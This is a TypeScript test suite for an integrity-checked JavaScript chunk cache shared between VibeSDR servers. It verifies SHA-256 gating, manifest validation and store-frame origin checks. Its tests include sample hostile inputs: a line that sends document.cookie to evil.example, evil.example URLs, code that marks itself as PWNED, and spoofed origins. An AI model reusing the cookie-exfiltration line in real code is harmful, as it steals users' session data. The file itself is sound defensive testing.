// test_chunk_cache.ts — the SHARED, INTEGRITY-VERIFIED CHUNK CACHE (web/client/src/chunkCache.ts,
// chunkVerify.ts, directory/public/store.html, scripts/build-web.mjs).
//
// ★★★ WHAT MUST HOLD (Stuart, 2026-10-01: "security checks to make sure everything is correct and that
//     nobody has hosted a virus-ridden server to send malware via our maps"):
//   1. A page runs a stored chunk ONLY if its SHA-256 is the hash in this server's own page. Poisoned,
//      truncated, swapped or padded bytes are refused, and the page fetches from its own server.
//   2. The build's embedded hash IS the SHA-256 of the file it serves — in web/dist AND in the copy
//      compiled into vibe_web_page.h (what a real server hands out).
//   3. Server B loads the map from the store with ZERO fetches of the chunk; a tampered entry is
//      ignored, refetched, re-verified and replaced.
//   4. The store frame answers only https://<label>.vibeserver.vibesdr.net, refuses a put whose bytes
//      do not match its key, bounds itself, and never routes a chunk op through the settings record.
//   5. Every failure is today's behaviour: off the domain, no manifest, no store, server mismatch.
// ★ SILENT: no browser, no network, no audio. Needs `node scripts/build-web.mjs` to have run (web/dist).
//   usage: node --no-warnings scripts/test_chunk_cache.ts
import { createHash, webcrypto } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import * as esbuild from 'esbuild';
import { parseManifest, rewriteImports, verifyChunk, toHex } from '../web/client/src/chunkVerify.ts';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
let pass = 0, fail = 0;
const ok = (c: unknown, what: string) => { c ? pass++ : fail++; console.log(`   ${c ? 'ok  ' : 'FAIL'} ${what}`); };
const sha = (b: Uint8Array) => createHash('sha256').update(b).digest('hex');
const subtle = webcrypto.subtle as any;

// ── 1. the gate, pure ────────────────────────────────────────────────────────────────────────────
console.log('── verifyChunk ──');
{
  const good = new TextEncoder().encode(`export const VIBEMAP_JS = "the real renderer";`.padEnd(96, " "));
  const e = { sha256: sha(good), size: good.length };
  ok(await verifyChunk(e, good, subtle), 'the exact bytes are accepted');
  const flipped = good.slice(); flipped[10] ^= 1;
  ok(!(await verifyChunk(e, flipped, subtle)), 'one flipped bit is refused');
  const poison = new TextEncoder().encode('fetch("https://evil.example/"+document.cookie);//'.padEnd(good.length, ' '));
  ok(poison.length === good.length && !(await verifyChunk(e, poison, subtle)), 'same-length malicious code is refused');
  ok(!(await verifyChunk(e, good.subarray(0, good.length - 1), subtle)), 'a truncated copy is refused');
  const padded = new Uint8Array(good.length + 1); padded.set(good);
  ok(!(await verifyChunk(e, padded, subtle)), 'a padded copy is refused');
  ok(!(await verifyChunk(e, null, subtle)) && !(await verifyChunk(e, undefined, subtle)), 'nothing is refused');
  ok(!(await verifyChunk(e, Array.from(good) as any, subtle)), 'a non-Uint8Array is refused');
  ok(!(await verifyChunk({ sha256: e.sha256.toUpperCase(), size: e.size }, good, subtle)), 'a malformed expected hash refuses everything');
  ok(!(await verifyChunk({ sha256: '', size: e.size }, good, subtle)), 'an empty expected hash refuses everything');
  ok(toHex(new Uint8Array([0, 15, 255]).buffer) === '000fff', 'hex encoding');
}

console.log('── parseManifest ──');
{
  const m = { vibemap: { file: 'c-ABC123.js', sha256: 'a'.repeat(64), size: 10, rewrite: ['./c-XYZ.js'] } };
  ok(parseManifest(JSON.stringify(m))?.vibemap?.sha256 === 'a'.repeat(64), 'a well-formed manifest parses');
  const bad = (patch: any, what: string) =>
    ok(parseManifest(JSON.stringify({ vibemap: { ...m.vibemap, ...patch } })) === null, `refused: ${what}`);
  bad({ file: '../app.js' }, 'a file outside /vs/ chunks');
  bad({ file: 'https://evil.example/c-A.js' }, 'an absolute file URL');
  bad({ sha256: 'A'.repeat(64) }, 'an upper-case hash');
  bad({ sha256: 'a'.repeat(63) }, 'a short hash');
  bad({ size: 0 }, 'a zero size');
  bad({ size: 1.5 }, 'a fractional size');
  bad({ rewrite: ['https://evil.example/x.js'] }, 'a rewrite that is not a ./c-*.js specifier');
  bad({ rewrite: 'x' }, 'a rewrite that is not a list');
  ok(parseManifest('{') === null && parseManifest('[]') === null && parseManifest('null') === null, 'garbage is refused');
  ok(parseManifest(JSON.stringify({ 'Bad Name': m.vibemap })) === null, 'a bad chunk name is refused');
}

console.log('── rewriteImports ──');
{
  const src = new Uint8Array([...new TextEncoder().encode('import"./c-AAA.js";import{a}from"./c-BBB.js";const s="\0\x01";import("./c-AAA.js")')]);
  const out = rewriteImports(src, ['./c-AAA.js', './c-BBB.js'], (s) => 'https://x.vibeserver.vibesdr.net/vs/' + s.slice(2));
  const t = Buffer.from(out).toString('latin1');
  ok(t === 'import"https://x.vibeserver.vibesdr.net/vs/c-AAA.js";import{a}from"https://x.vibeserver.vibesdr.net/vs/c-BBB.js";const s="\0\x01";import("https://x.vibeserver.vibesdr.net/vs/c-AAA.js")',
     'every quoted specifier is made absolute, binary bytes untouched');
  let threw = false; try { rewriteImports(src, ['./c-NOPE.js'], (s) => s); } catch { threw = true; }
  ok(threw, 'a specifier the chunk does not contain throws (not the chunk the build described)');
  threw = false; try { rewriteImports(src, ['../evil.js'], (s) => s); } catch { threw = true; }
  ok(threw, 'a specifier that is not ./c-*.js throws');
}

// ── 2. the build's embedded hashes are the served bytes' hashes ─────────────────────────────────
console.log('── build-web.mjs manifest ──');
const DIST = path.join(root, 'web/dist');
const html = fs.readFileSync(path.join(DIST, 'vibesdr.html'), 'utf8');
const tag = /<script type="application\/json" id="vs-chunks">([^<]*)<\/script>/.exec(html);
const manifest = tag ? parseManifest(tag[1]) : null;
ok(manifest && manifest.vibemap && manifest.admin, 'the page carries a manifest naming the map renderer and the admin panel');
ok(manifest && !Object.keys(manifest).includes('opus'), 'the Opus decoder is not in it (decided: see chunkCache.ts)');
for (const [name, e] of Object.entries(manifest || {})) {
  const bytes = fs.readFileSync(path.join(DIST, 'vs', e.file));
  ok(sha(bytes) === e.sha256 && bytes.length === e.size, `${name}: embedded sha256/size = web/dist/vs/${e.file} (${(e.size / 1024).toFixed(1)} KB)`);
  const text = bytes.toString('latin1');
  ok(e.rewrite.every((s) => text.includes(JSON.stringify(s)) && fs.existsSync(path.join(DIST, 'vs', s.slice(2)))),
     `${name}: every chunk it imports is listed, quoted in it, and built`);
  const all = text.match(/"\.\/c-[A-Z0-9]+\.js"/g) || [];
  ok(all.every((q) => e.rewrite.includes(q.slice(1, -1))), `${name}: no chunk import is left unlisted`);
  ok(!/import\.meta/.test(text), `${name}: no import.meta (it would point at the blob)`);
}
// ★ What a REAL server serves: vibe_web_page.h, decoded the way the server decodes it.
{
  const h = fs.readFileSync(path.join(root, 'android/app/src/main/cpp/vibe_web_page.h'), 'utf8');
  const lit = (n: string) => {
    const m = new RegExp(`static const char ${n}\\[\\] =\\n((?:  "[^"]*"\\n?)+);`).exec(h);
    return m ? Buffer.from(m[1].replace(/[\s"]/g, ''), 'base64') : null;
  };
  const page = lit('kVibeWebA0_raw');
  ok(page && page.equals(Buffer.from(html, 'utf8')), 'vibe_web_page.h carries this same page (manifest included)');
  const rows = [...h.matchAll(/\{ "(\/vs\/[^"]+)", "[^"]+", \{ (kVibeWebA\d+)_raw/g)];
  for (const [name, e] of Object.entries(manifest || {})) {
    const row = rows.find((r) => r[1] === '/vs/' + e.file);
    const b = row && lit(row[2] + '_raw');
    ok(b && sha(b) === e.sha256, `${name}: the header's /vs/${e.file} hashes to the embedded sha256`);
  }
}

// ── 3. the page's flow, against a fake store and a fake server (two "servers", one store) ────────
console.log('── chunkCache flow ──');
const tmp = fs.mkdtempSync(path.join(process.env.TMPDIR || os.tmpdir(), 'chunk-cache-'));
for (const f of fs.readdirSync(path.join(DIST, 'vs'))) if (f.endsWith('.js')) fs.copyFileSync(path.join(DIST, 'vs', f), path.join(tmp, f));
const built = await esbuild.build({
  entryPoints: [path.join(root, 'web/client/src/chunkCache.ts')],
  bundle: true, write: false, format: 'esm', platform: 'neutral', logLevel: 'silent',
  plugins: [{ name: 'fakes', setup(b) {
    b.onResolve({ filter: /^\.\/(portable|admin|generated\/vibemapSource)$/ }, (a) => ({ path: a.path, namespace: 'fake' }));
    b.onLoad({ filter: /.*/, namespace: 'fake' }, (a) => ({ loader: 'js', contents:
      a.path === './portable'
        ? 'export const onVibeDomain = () => globalThis.__t.onDomain; export const storeRequest = (m, ms, tr) => globalThis.__t.store(m, ms, tr);'
        : `globalThis.__t.fallbacks++; export const VIBEMAP_JS = 'FALLBACK'; export const initAdmin = () => {};` }));
  } }],
});
fs.writeFileSync(path.join(tmp, 'harness.mjs'), built.outputFiles[0].text);

interface T { onDomain: boolean; fallbacks: number; fetches: string[]; gets: number; puts: number; store: (m: any, ms: number, tr?: any) => Promise<any> }
const store = new Map<string, ArrayBuffer>();
let storeUp = true;
const t: T = (globalThis as any).__t = {
  onDomain: true, fallbacks: 0, fetches: [], gets: 0, puts: 0,
  async store(m: any) {
    if (!storeUp) return null;
    if (m.op === 'chunkGet') { t.gets++; const b = store.get(m.sha); return b ? { ok: true, bytes: b.slice(0) } : { ok: false }; }
    if (m.op === 'chunkPut') { t.puts++; store.set(m.sha, m.bytes.slice(0)); return { ok: true }; }
    return null;
  },
};
let serverServes: ((f: string) => Uint8Array) = (f) => fs.readFileSync(path.join(tmp, f));
(globalThis as any).isSecureContext = true;
(globalThis as any).fetch = async (u: URL | string) => {
  const f = path.basename(String(u)); t.fetches.push(f);
  const b = serverServes(f);
  return { ok: true, arrayBuffer: async () => b.buffer.slice(b.byteOffset, b.byteOffset + b.byteLength) };
};
let manifestText = tag ? tag[1] : '';
(globalThis as any).document = { getElementById: (id: string) => (id === 'vs-chunks' && manifestText ? { textContent: manifestText } : null) };
// ★ Node cannot import a blob: URL; the page can. Keep each Blob's parts and hand back a data: URL of
//   the SAME bytes, so what runs here is exactly what the page would run.
const RealBlob = globalThis.Blob;
(globalThis as any).Blob = class extends RealBlob { parts: any[]; constructor(p: any[], o?: any) { super(p, o); this.parts = p; } };
URL.createObjectURL = (b: any) => 'data:text/javascript;base64,' + Buffer.concat(b.parts.map((p: any) => Buffer.from(p))).toString('base64');
URL.revokeObjectURL = () => {};

const realMap = (await import(pathToFileURL(path.join(tmp, manifest!.vibemap.file)).href)).VIBEMAP_JS as string;
let n = 0;
const server = async () => (await import(pathToFileURL(path.join(tmp, 'harness.mjs')).href + '?server=' + (++n)));
const reset = () => { t.fallbacks = 0; t.fetches = []; t.gets = 0; t.puts = 0; };
const vm = manifest!.vibemap;

reset();
{
  const m = await (await server()).loadVibemapSource();
  ok(m.VIBEMAP_JS === realMap && t.fallbacks === 0, 'server A, empty store: the map runs (from the verified fetch)');
  ok(t.fetches.length === 1 && t.fetches[0] === vm.file, 'server A: fetched once from its own server');
  ok(t.puts === 1 && store.has(vm.sha256) && sha(new Uint8Array(store.get(vm.sha256)!)) === vm.sha256, 'server A: saved to the store under its hash');
}
reset();
{
  const m = await (await server()).loadVibemapSource();
  ok(m.VIBEMAP_JS === realMap && t.fallbacks === 0, 'server B: the map runs from the store');
  ok(t.fetches.length === 0, 'server B: ZERO fetches of the chunk');
  ok(t.gets === 1 && t.puts === 0, 'server B: one store read, nothing re-stored');
}
reset();
{
  // ★ A hostile server overwrites the entry with code that would mark itself if it ever ran.
  const evil = Buffer.from(`globalThis.PWNED=1;export const VIBEMAP_JS="evil";`.padEnd(vm.size, ' '));
  store.set(vm.sha256, new Uint8Array(evil).buffer);
  const m = await (await server()).loadVibemapSource();
  ok(!(globalThis as any).PWNED && m.VIBEMAP_JS === realMap, 'tampered store entry: NOT run; the real map runs');
  ok(t.fetches.length === 1 && t.puts === 1 && sha(new Uint8Array(store.get(vm.sha256)!)) === vm.sha256,
     'tampered store entry: refetched from this server, verified, and the entry replaced with the good copy');
}
reset();
{
  // ★ A different, perfectly valid chunk under the map's key — the store does not choose what runs.
  store.set(vm.sha256, new Uint8Array(fs.readFileSync(path.join(tmp, manifest!.admin.file))).buffer);
  const m = await (await server()).loadVibemapSource();
  ok(m.VIBEMAP_JS === realMap && t.fetches.length === 1, 'another genuine chunk under the map\'s hash: refused, refetched');
}
reset();
{
  // ★ This server serves bytes that do not match its own page (mid-update, or tampered on the wire).
  store.clear();
  serverServes = () => Buffer.from(`globalThis.PWNED=2;export const VIBEMAP_JS="evil";`);
  const m = await (await server()).loadVibemapSource();
  ok(!(globalThis as any).PWNED && m.VIBEMAP_JS === 'FALLBACK' && t.fallbacks === 1, 'server bytes that fail the check: not run — the plain import() runs instead');
  ok(t.puts === 0 && store.size === 0, '... and nothing is stored');
  serverServes = (f) => fs.readFileSync(path.join(tmp, f));
}
reset();
{
  storeUp = false;
  const m = await (await server()).loadVibemapSource();
  ok(m.VIBEMAP_JS === realMap && t.fetches.length === 1, 'store unreachable: fetched from this server as before');
  storeUp = true;
}
reset();
{
  t.onDomain = false;
  const m = await (await server()).loadVibemapSource();
  ok(m.VIBEMAP_JS === 'FALLBACK' && t.fallbacks === 1 && t.gets === 0 && t.fetches.length === 0, 'off the VibeSDR.net domain: the plain import(), store never asked');
  t.onDomain = true;
}
reset();
{
  manifestText = '';
  const m = await (await server()).loadVibemapSource();
  ok(m.VIBEMAP_JS === 'FALLBACK' && t.gets === 0, 'no manifest in the page: the plain import()');
  manifestText = tag ? tag[1] : '';
}
reset();
{
  (globalThis as any).isSecureContext = false;
  const m = await (await server()).loadVibemapSource();
  ok(m.VIBEMAP_JS === 'FALLBACK' && t.gets === 0, 'not a secure context (no WebCrypto): the plain import()');
  (globalThis as any).isSecureContext = true;
}
reset();
{
  const s = await server();
  const [a, b] = await Promise.all([s.loadVibemapSource(), s.loadVibemapSource()]);
  ok(a === b && t.gets + t.fetches.length <= 2, 'two callers at once (map window + admin map) share one load');
}

// ── 4. the store frame (directory/public/store.html), run for real against an in-memory IndexedDB ─
console.log('── store.html chunk protocol ──');
{
  const page = fs.readFileSync(path.join(root, 'directory/public/store.html'), 'utf8');
  const code = /<script>([\s\S]*)<\/script>/.exec(page)![1];
  const listeners: ((e: any) => void)[] = [];
  const idb = fakeIndexedDB();
  let cookieWrites = 0;
  const doc = { get cookie() { return ''; }, set cookie(_v: string) { cookieWrites++; } };
  const ls = { getItem: () => null, setItem: () => { throw new Error('settings must not be touched'); }, removeItem() {} };
  new Function('window', 'document', 'indexedDB', 'localStorage', code)(
    { addEventListener: (_: string, f: any) => listeners.push(f) }, doc, idb, ls);
  let id = 0;
  const send = (origin: string, data: any, wait = 200) => new Promise<any>((res) => {
    const d = { ...data, id: ++id };
    let got: any = null;
    const source = { postMessage: (r: any, o: string) => { got = { r, o }; } };
    for (const f of listeners) f({ origin, data: d, source });
    setTimeout(() => res(got), wait);
  });
  const A = 'https://pi500.vibeserver.vibesdr.net';
  const b = new Uint8Array(fs.readFileSync(path.join(DIST, 'vs', vm.file)));
  const buf = () => b.slice().buffer;
  let r = await send(A, { op: 'chunkPut', sha: vm.sha256, name: 'vibemap', bytes: buf() });
  ok(r?.r.ok === true && r.o === A, 'a put of genuine bytes from a VibeSDR.net server is kept; the reply goes to THAT origin');
  r = await send('https://lenovo.vibeserver.vibesdr.net', { op: 'chunkGet', sha: vm.sha256 });
  ok(r?.r.ok === true && sha(new Uint8Array(r.r.bytes)) === vm.sha256, 'another VibeSDR.net server reads the same bytes back');
  for (const o of ['https://evil.example', 'http://pi500.vibeserver.vibesdr.net', 'https://pi500.vibeserver.vibesdr.net.evil.example',
                   'https://a.b.vibeserver.vibesdr.net', 'https://vibeserver.vibesdr.net', 'null', 'https://pi500.vibeserver.vibesdr.net:8443']) {
    r = await send(o, { op: 'chunkGet', sha: vm.sha256 }, 50);
    ok(r === null, `no answer at all to ${o}`);
  }
  r = await send('https://evil.example', { op: 'chunkPut', sha: 'f'.repeat(64), name: 'vibemap', bytes: buf() }, 50);
  ok(r === null && !idb.has('f'.repeat(64)), 'a put from a foreign origin is ignored');
  r = await send(A, { op: 'chunkPut', sha: 'e'.repeat(64), name: 'vibemap', bytes: buf() });
  ok(r?.r.ok === false && !idb.has('e'.repeat(64)), 'a put whose bytes do not hash to its key is refused');
  r = await send(A, { op: 'chunkPut', sha: vm.sha256, name: '../x', bytes: buf() });
  ok(r?.r.ok === false, 'a bad chunk name is refused');
  r = await send(A, { op: 'chunkPut', sha: 'X', name: 'vibemap', bytes: buf() });
  ok(r?.r.ok === false, 'a malformed key is refused');
  const big = new Uint8Array(600 * 1024);
  r = await send(A, { op: 'chunkPut', sha: sha(big), name: 'vibemap', bytes: big.buffer });
  ok(r?.r.ok === false && !idb.has(sha(big)), 'a chunk over 512 KB is refused');
  r = await send(A, { op: 'chunkGet', sha: 'd'.repeat(64) });
  ok(r?.r.ok === false, 'a miss answers ok:false');
  ok(cookieWrites === 0, 'no chunk operation touched the settings record (no cookie write, no localStorage write)');
  // Eviction: three versions of one name — only the two most recently used stay.
  const vers = [1, 2, 3].map((i) => new TextEncoder().encode('version ' + i));
  for (const v of vers) { await send(A, { op: 'chunkPut', sha: sha(v), name: 'admin', bytes: v.slice().buffer }); await new Promise((r) => setTimeout(r, 5)); }
  ok(!idb.has(sha(vers[0])) && idb.has(sha(vers[1])) && idb.has(sha(vers[2])) && idb.has(vm.sha256),
     'three versions of one chunk: the oldest is evicted, the newest two (and other chunks) stay');
  const ev = new Function(/function evictions\(all\) \{[\s\S]*?\n  \}\n/.exec(code)![0].replace(/^/, 'var CKEEP = 2, CTOTAL = 1536 * 1024;\n') + 'return evictions;')();
  const many = Array.from({ length: 8 }, (_, i) => ({ sha: 's' + i, name: 'n' + i, size: 300 * 1024, used: i }));
  const dropped = ev(many).sort();
  ok(dropped.join() === 's0,s1,s2', `total cap 1.5 MB: the least recently used go first (dropped ${dropped.join()})`);
}

fs.rmSync(tmp, { recursive: true, force: true });
console.log(`\n   ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);

/** The slice of IndexedDB store.html uses — one object store keyed by `sha` — in memory. */
function fakeIndexedDB() {
  const data = new Map<string, any>();
  const later = (f: () => void) => setTimeout(f, 0);
  const transaction = () => {
    const tx: any = { oncomplete: null, onerror: null, onabort: null, pending: 0 };
    const settle = () => later(() => { if (tx.pending === 0 && !tx.done) { tx.done = true; tx.oncomplete?.(); } });
    const op = (run: () => any) => {
      tx.pending++;
      const r: any = { result: undefined, onsuccess: null, onerror: null };
      later(() => { r.result = run(); r.onsuccess?.({ target: r }); tx.pending--; settle(); });
      return r;
    };
    tx.objectStore = () => ({
      get: (k: string) => op(() => (data.has(k) ? structuredClone(data.get(k)) : undefined)),
      put: (v: any) => op(() => { data.set(v.sha, structuredClone(v)); }),
      delete: (k: string) => op(() => { data.delete(k); }),
      openCursor: () => {
        const keys = [...data.keys()];
        let i = 0;
        tx.pending++;
        const r: any = { onsuccess: null };
        const step = () => later(() => {
          if (i >= keys.length) { r.onsuccess?.({ target: { result: null } }); tx.pending--; settle(); return; }
          const k = keys[i++];
          r.onsuccess?.({ target: { result: { value: structuredClone(data.get(k)), continue: step } } });
        });
        step();
        return r;
      },
    });
    settle();
    return tx;
  };
  return {
    has: (k: string) => data.has(k),
    open: () => {
      const r: any = { result: null, onupgradeneeded: null, onsuccess: null, onerror: null, onblocked: null };
      later(() => {
        r.result = { createObjectStore() {}, transaction };
        r.onupgradeneeded?.();
        r.onsuccess?.();
      });
      return r;
    },
  };
}
